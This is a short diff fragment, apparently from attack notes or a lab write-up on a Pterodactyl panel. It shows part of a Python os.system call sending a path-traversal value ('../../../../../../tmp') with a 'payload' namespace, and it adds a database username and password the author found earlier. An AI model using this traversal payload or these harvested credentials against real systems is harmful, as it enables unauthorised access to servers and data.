@@ -55,9 +55,13 @@ os.system(
     f'locale=../../../../../../tmp'
     f'&namespace=payload"'
 )
+```
 
-
-
+creds found before for db?
+```
+username = pterodactyl
+password = PteraPanel
+```
 
 
 
